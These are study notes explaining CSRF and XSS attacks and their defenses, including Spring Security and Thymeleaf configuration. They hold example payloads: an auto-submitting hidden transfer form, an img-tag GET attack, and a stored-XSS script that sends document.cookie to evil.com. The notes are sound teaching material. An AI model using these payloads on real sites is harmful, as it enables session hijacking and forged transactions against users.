# CSRF and XSS: Notes

---

# Part 1: Cross-Site Request Forgery (CSRF)

## 1. What is CSRF?

CSRF is an attack where an attacker tricks an **already logged-in** user's browser into sending an unwanted, state-changing request to a web application.

- The attacker does not steal the password or session.
- The attacker makes the victim's browser send the request, so the user's logged-in state is used without their knowledge.
- The server cannot tell a genuine request from a forged one.

**In one line:** the server trusts the browser's cookie, and the attacker abuses that trust.

## 2. Why CSRF is possible

| Cause | Explanation |
|---|---|
| Session trust | Apps identify users by cookie or session ID. If the cookie is present, the request is assumed to be from the user. |
| Automatic cookie sending | The browser attaches cookies to every request to a domain, no matter which site triggered the request. |
| No request verification | The server does not check that the user intended the request (no token, no origin check). |
| Cross-site requests allowed | A form or `<img>` on `malicious.com` can send a request to `bank.com`, and the browser still adds `bank.com`'s cookies (unless `SameSite` blocks it). |

> The attacker can **send** a request but normally cannot **read** the response.

## 3. Example attack (banking)

1. The user logs in to `https://bank.com`, and the browser stores the session cookie.
2. While still logged in, the user visits `https://malicious.com`.
3. That page silently triggers:

```
POST https://bank.com/transfer
amount = 10000
to     = attacker
Cookie: JSESSIONID=ABC123     <-- added automatically by the browser
```

4. The bank sees a valid cookie, assumes the user made the request, and transfers the money.

A malicious page can do this with a hidden form:

```html
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('f').submit();</script>
```

If the app wrongly uses GET for an action, a single image tag is enough:

```html
<img src="https://bank.com/transfer?amount=10000&to=attacker">
```

## 4. Impact

CSRF can make the victim's browser **perform actions**: change email or password, transfer money, post or delete content, change settings, make purchases.

For example, if an attacker forces a "change email" request, you may later find your login "invalid" because the account is now tied to the attacker's details.

CSRF **cannot read data**, because the attacker never sees the response.

## 5. How CSRF protection works (CSRF token)

The server generates a random, unpredictable token tied to the user's session and requires it on every state-changing request (POST, PUT, PATCH, DELETE).

Legitimate request:

```
POST /transfer
Cookie: JSESSIONID=ABC123
CSRF-Token: ABC123XYZ      <-- added by the real application
```

Validation flow:

```
Request received
      ↓
Take the CSRF token from the request (header or form field)
      ↓
Compare with the expected token stored for the session
      ↓
Valid?  Yes → process request
        No  → reject with 403 Forbidden
```

## 6. Why can't the attacker just get the token?

The token is only available in the legitimate site's own pages. Because of the **Same-Origin Policy**, `malicious.com` can make the browser send a request to `bank.com`, but cannot read anything from `bank.com`.

```
POST /transfer
Cookie: JSESSIONID=ABC123     ✅ browser adds it automatically
CSRF-Token: ???               ❌ attacker doesn't know it
        ↓
   403 Forbidden
```

**Key idea:** cookies are sent automatically, but the token must be sent deliberately by the app's own code. The attacker cannot do that.

## 7. Other defenses

- **SameSite cookies:** `SameSite=Lax` or `Strict` stops the browser from sending the cookie on cross-site POST requests. Modern browsers default to `Lax`.
- **Origin / Referer check:** reject requests that don't come from your own domain.
- **Never use GET for state-changing actions.**
- **Re-authentication or OTP** for sensitive actions such as password change or money transfer.

## 8. CSRF protection in Spring Security

- Enabled **by default** for POST, PUT, PATCH and DELETE.
- Safe methods (GET, HEAD, OPTIONS, TRACE) are not checked.
- A missing or invalid token gives **403 Forbidden**.

Thymeleaf forms include the token automatically. In a plain HTML form:

```html
<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}" />
```

For SPAs (React/Angular) using a cookie-based token:

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    );
    return http.build();
}
```

The frontend reads the `XSRF-TOKEN` cookie and sends it back in the `X-XSRF-TOKEN` header.

Disabling CSRF is acceptable only for stateless APIs that send the token in a header (not a cookie):

```java
http.csrf(csrf -> csrf.disable());
```

> Don't disable CSRF for apps that use session cookies or browser form logins.

## 9. On using JWT

A JWT sent in the `Authorization` header is not attached automatically by the browser, so CSRF is not a concern. If the JWT is stored in a **cookie**, the browser sends it automatically and CSRF protection is needed again.

## 10. User-side precautions

- Log out of sensitive sites when you're not using them.
- Avoid clicking suspicious links.
- Keep your browser and software updated.
- Use reputable security extensions.

---

# Part 2: Cross-Site Scripting (XSS)

## 1. What is XSS?

XSS is an attack where an attacker injects malicious **JavaScript** into a website, and that script then runs in **other users' browsers** as if it were part of the trusted site.

- The script runs in the vulnerable site's origin, so it can access cookies, localStorage and the page, and can make authenticated requests as the user.
- The attacker does not attack the server directly. The site delivers the attack to its own users.

**In one line:** the browser trusts the site, so it runs whatever script the site sends, even one an attacker planted.

> It is called XSS (not CSS) to avoid confusion with Cascading Style Sheets.

## 2. What an attacker can do

- Steal session cookies or tokens (session hijacking)
- Read data on the page, including CSRF tokens
- Perform actions as the user (post, change email, transfer money)
- Show fake login forms inside the real site
- Deface the page or redirect to a malicious site
- Log keystrokes

## 3. Why XSS happens

| Cause | Explanation | Example |
|---|---|---|
| No input validation | The app accepts anything the user types | A comment box accepts `<script>alert('Hacked!');</script>` |
| No escaping on output | Input is not cleaned before being displayed | `<script>` should be shown as `&lt;script&gt;` |
| Unsafe rendering | User input is inserted as HTML instead of text | Using `innerHTML` with user data |
| Wrong escaping for the context | Special characters are treated as code | `<img src="x" onerror="alert('Hacked!')">` runs JS when the image fails |
| No extra protections | No CSP, cookies not `HttpOnly` | Any injected script runs freely |

**Core problem:** untrusted data is mixed with code, and the browser cannot tell them apart.

## 4. Example (comment box)

1. A blog lets users post comments.
2. The attacker posts this as a comment:

```html
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>
```

3. The server stores it without escaping.
4. Every visitor who opens the page gets the comment inserted into the HTML. The script runs in their browser and sends their cookie to the attacker.

Vulnerable code (concept):

```java
// BAD: raw user input placed into HTML
out.println("<p>" + comment + "</p>");
```

Safe output (escaped, so it displays as text):

```html
<p>&lt;script&gt;...&lt;/script&gt;</p>
```

## 5. Types of XSS

| Type | Where the payload lives | Who is affected |
|---|---|---|
| **Stored** | Saved on the server (comment, profile) | Everyone who views that content |
| **Reflected** | In a URL or request, echoed back by the server | Users who click the crafted link |
| **DOM-based** | In the browser: client-side JS writes URL data into the page unsafely | Users who open the crafted URL |

Note: XSS is not only `<script>`. Event handlers (`onerror`, `onload`) and `javascript:` URLs also run code, so blocking `<script>` alone is not enough.

## 6. Prevention

1. **Output encoding (main defense):** convert special characters before inserting user data into a page (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`). Encode for the context (HTML body, attribute, JavaScript, URL).
2. **Input validation:** accept only expected formats. This helps but is not enough on its own.
3. **Sanitize rich HTML** (if users may submit HTML) with a trusted library such as DOMPurify or the OWASP Java HTML Sanitizer.
4. **Content Security Policy (CSP):** restricts which scripts may run, as an extra layer.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

5. **`HttpOnly` and `Secure` cookies:** JavaScript cannot read an `HttpOnly` cookie, so `document.cookie` theft fails.
6. **Use safe APIs:** prefer `textContent` over `innerHTML`, and `th:text` over `th:utext` in Thymeleaf. Be careful with `dangerouslySetInnerHTML` in React.

Thymeleaf example:

```html
<!-- Safe: escaped -->
<p th:text="${comment}"></p>

<!-- Dangerous: unescaped -->
<p th:utext="${comment}"></p>
```

> Spring Security adds some protective headers, but it does not escape your output. That is done by the template engine and your own code.

---

# Part 3: CSRF vs XSS

| | CSRF | XSS |
|---|---|---|
| Attacker's goal | Make the victim's browser perform actions | Run malicious script in the victim's browser |
| Exploits | The server's trust in the browser (cookies) | The user's trust in the site / missing output encoding |
| Can read responses? | No | Yes |
| Main defenses | CSRF tokens, SameSite, Origin check | Output encoding, CSP, HttpOnly |

XSS can **bypass CSRF protection**, because the injected script runs on the same origin and can read the CSRF token from the page. So XSS has to be fixed for CSRF defenses to hold.

